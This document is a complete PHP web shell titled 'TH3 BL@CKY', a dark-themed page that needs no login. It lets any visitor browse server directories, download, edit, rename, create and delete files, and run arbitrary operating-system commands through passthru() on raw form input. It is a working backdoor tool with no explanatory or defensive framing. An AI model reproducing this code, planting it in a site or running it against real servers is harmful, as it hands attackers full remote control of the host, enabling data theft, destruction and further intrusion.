<?php
    ini_set('display_errors', 1);
    error_reporting(E_ALL);
    set_time_limit(0);
    ignore_user_abort(true);
    ini_set('max_execution_time', 0);
    ini_set('memory_limit', '2048M');

function listDirectory($path) {
    $files = scandir($path);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        echo "<li>";
        if (is_dir("$path/$file")) {
            echo "<a href=\"?path=$path/$file\">$file</a>";
            echo "<form action=\"\" method=\"post\" style=\"display:inline-block;\">
                    <input type=\"hidden\" name=\"action\" value=\"delete\">
                    <input type=\"hidden\" name=\"path\" value=\"$path\">
                    <input type=\"hidden\" name=\"file\" value=\"$file\">
                    <button type=\"submit\">Delete</button>
                </form>";
            echo "<form action=\"\" method=\"post\" style=\"display:inline-block;\">
                    <input type=\"text\" name=\"newname\" placeholder=\"New folder name\">
                    <input type=\"hidden\" name=\"action\" value=\"rename\">
                    <input type=\"hidden\" name=\"path\" value=\"$path\">
                    <input type=\"hidden\" name=\"file\" value=\"$file\">
                    <button type=\"submit\">Rename</button>
                </form>";
        } else {
            echo "<a href=\"?download=$path/$file\">$file</a>";
            echo "<form action=\"\" method=\"post\" style=\"display:inline-block;\">
                    <input type=\"hidden\" name=\"action\" value=\"delete\">
                    <input type=\"hidden\" name=\"path\" value=\"$path\">
                    <input type=\"hidden\" name=\"file\" value=\"$file\">
                    <button type=\"submit\">Delete</button>
                </form>";
            if (is_text_file("$path/$file")) {
                echo "<form action=\"\" method=\"post\" style=\"display:inline-block;\">
                        <input type=\"hidden\" name=\"action\" value=\"edit\">
                        <input type=\"hidden\" name=\"path\" value=\"$path\">
                        <input type=\"hidden\" name=\"file\" value=\"$file\">
                        <button type=\"submit\">Edit</button>
                    </form>";
            }
            echo "<form action=\"\" method=\"post\" style=\"display:inline-block;\">
                    <input type=\"text\" name=\"newname\" placeholder=\"New file name\">
                    <input type=\"hidden\" name=\"action\" value=\"rename\">
                    <input type=\"hidden\" name=\"path\" value=\"$path\">
                    <input type=\"hidden\" name=\"file\" value=\"$file\">
                    <button type=\"submit\">Rename</button>
                </form>";
        }
        echo "</li>";
    }
}

function is_text_file($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['txt', 'log', 'php', 'html', 'css', 'js', 'md', 'json']);
}

if(isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = '.';
}

if(isset($_GET['download'])) {
    $file = $_GET['download'];
    if(file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

if(isset($_POST['action'])) {
    $action = $_POST['action'];
    $file = isset($_POST['file']) ? $_POST['file'] : '';
    $path = isset($_POST['path']) ? $_POST['path'] : '.';
    
    if($action === 'delete' && !empty($file)) {
        $filepath = $path . '/' . $file;
        if(is_file($filepath)) {
            unlink($filepath);
            echo "File $file has been deleted successfully.";
        } elseif(is_dir($filepath)) {
            rmdir($filepath);
            echo "Directory $file has been deleted successfully.";
        } else {
            echo "Failed to delete $file.";
        }
    } elseif($action === 'edit' && !empty($file)) {
        $filepath = $path . '/' . $file;
        if(is_file($filepath)) {
            $content = file_get_contents($filepath);
            echo "<h2>Edit File: $file</h2>";
            echo "<form action=\"\" method=\"post\">
                    <textarea name=\"content\" rows=\"10\" cols=\"50\">$content</textarea><br>
                    <input type=\"hidden\" name=\"action\" value=\"save\">
                    <input type=\"hidden\" name=\"path\" value=\"$path\">
                    <input type=\"hidden\" name=\"file\" value=\"$file\">
                    <button type=\"submit\">Save</button>
                </form>";
        } else {
            echo "File $file does not exist or is not accessible.";
        }
    } elseif($action === 'save' && !empty($file) && isset($_POST['content'])) {
        $content = $_POST['content'];
        $filepath = $path . '/' . $file;
        if(is_file($filepath)) {
            file_put_contents($filepath, $content);
            echo "File $file has been saved successfully.";
        } else {
            echo "File $file does not exist or is not accessible.";
        }
    } elseif($action === 'rename' && !empty($file) && isset($_POST['newname'])) {
        $newname = $_POST['newname'];
        $oldpath = $path . '/' . $file;
        $newpath = $path . '/' . $newname;
        if(rename($oldpath, $newpath)) {
            echo "File $file has been renamed to $newname successfully.";
        } else {
            echo "Failed to rename $file.";
        }
    } elseif($action === 'create' && !empty($_POST['newfile'])) {
        $newfile = $_POST['newfile'];
        $newpath = $path . '/' . $newfile;
        if(!file_exists($newpath)) {
            if(is_dir($path)) {
                if(touch($newpath)) {
                    echo "File $newfile has been created successfully.";
                } else {
                    echo "Failed to create file $newfile.";
                }
            } else {
                echo "The specified path is not a directory.";
            }
        } else {
            echo "File $newfile already exists.";
        }
    } elseif ($action === 'execute' && isset($_POST['command'])) {
        $command = $_POST['command'];
        echo "<h2>Command Output</h2>";
        echo "<pre>";
        passthru($command);
        echo "</pre>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TH3 BL@CKY</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1f1f1f;
            color: #fff;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #333;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        h1 {
            text-align: center;
            margin-bottom: 20px;
        }

        .directory {
            margin-bottom: 20px;
            padding: 10px;
            background-color: #444;
            border-radius: 5px;
        }

        .directory h2 {
            margin-top: 0;
            margin-bottom: 10px;
            font-size: 1.5em;
        }

        .file-list {
            list-style-type: none;
            padding: 0;
            margin: 0;
        }

        .file-list li {
            padding: 10px;
            margin-bottom: 5px;
            background-color: #555;
            border-radius: 5px;
        }

        .file-list li a {
            color: #fff;
            text-decoration: none;
        }

        .file-list li button {
            background-color: #d9534f;
            color: #fff;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            margin-left: 10px;
        }

        .file-list li button:hover {
            background-color: #c9302c;
        }

        .upload-form {
            margin-bottom: 20px;
        }

        .upload-form input[type="file"] {
            display: none;
        }

        .upload-form label {
            background-color: #5bc0de;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
        }

        .upload-form label:hover {
            background-color: #46b8da;
        }

        .upload-form button {
            background-color: #5cb85c;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
        }

        .upload-form button:hover {
            background-color: #4cae4c;
        }

        .create-form input[type="text"],
        .create-form textarea {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            color: #333;
            resize: none;
        }

        .create-form button {
            background-color: #f0ad4e;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
        }

        .create-form button:hover {
            background-color: #eea236;
        }

        .shell-form input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #fff;
            color: #333;
        }

        .shell-form button {
            background-color: #428bca;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-block;
        }

        .shell-form button:hover {
            background-color: #3071a9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TH3 BL@CKY</h1>

        <div class="directory">
            <h2>Directory: <?php echo $path; ?></h2>
            <p>Server Root: <?php echo $_SERVER['DOCUMENT_ROOT']; ?></p>
            <form action="" method="get" class="path-form">
                <input type="text" name="path" placeholder="Enter path">
                <button type="submit">Go</button>
            </form>
        </div>

        <form action="" method="post" enctype="multipart/form-data" class="upload-form">
            <input type="file" name="file" id="file" style="display:none;">
            <label for="file">Choose File</label>
            <input type="hidden" name="action" value="upload">
            <button type="submit">Upload</button>
        </form>

        <form action="" method="post" class="create-form">
            <input type="text" name="newfile" placeholder="New file name">
            <textarea name="content" rows="4" placeholder="File content (optional)"></textarea>
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="path" value="<?php echo $path; ?>">
            <button type="submit">Create File</button>
        </form>

        <ul class="file-list">
            <?php listDirectory($path); ?>
        </ul>

        <form action="" method="post" class="shell-form">
            <input type="text" name="command" placeholder="Enter shell command">
            <input type="hidden" name="action" value="execute">
            <button type="submit">Execute</button>
        </form>
    </div>
</body>
</html>
